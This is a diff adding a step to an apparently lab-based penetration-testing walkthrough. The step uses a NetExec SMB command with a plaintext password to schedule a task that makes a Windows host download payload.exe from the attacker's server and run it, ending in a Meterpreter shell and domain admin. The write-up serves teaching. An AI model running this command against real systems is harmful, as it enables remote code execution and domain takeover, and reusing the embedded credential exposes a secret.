@@ -328,3 +328,26 @@ Next, we need to get our `payload.exe` on the target file server host!
 Let's first split our terminal again and set up a python server to host our payload:
 
 <figure><img src="../.gitbook/assets/image (1260).png" alt=""><figcaption></figcaption></figure>
+
+Now let's make our target fetch our payload on our local server, and then execute it to get our reverse shell
+
+```
+nxc smb 10.1.99.248 -u "benjaminm" -p "w5gzI6&xx%aBqZC^GZ" -M schtask_as -o USER=johna CMD="powershell \"iwr -Uri http://10.1.241.175:8000/payload.exe -OutFile C:/Windows/Tasks/payload.exe; C:/Windows/Tasks/payload.exe\""
+```
+
+<figure><img src="../.gitbook/assets/image (1261).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (1262).png" alt=""><figcaption></figcaption></figure>
+
+We got the two things that said that our exploit worked:
+
+1. Your Python HTTP server receive a `GET` request for our `payload.exe` and return a `200` status code for sucess
+2. Your Metasploit handler display: **`Meterpreter session 1 opened`**
+
+_**We got our callback!**_ 🔥
+
+<figure><img src="../.gitbook/assets/image (1263).png" alt=""><figcaption></figcaption></figure>
+
+And just like that we are **domain admin** :tada:
+
+<figure><img src="../.gitbook/assets/image (1264).png" alt=""><figcaption></figcaption></figure>
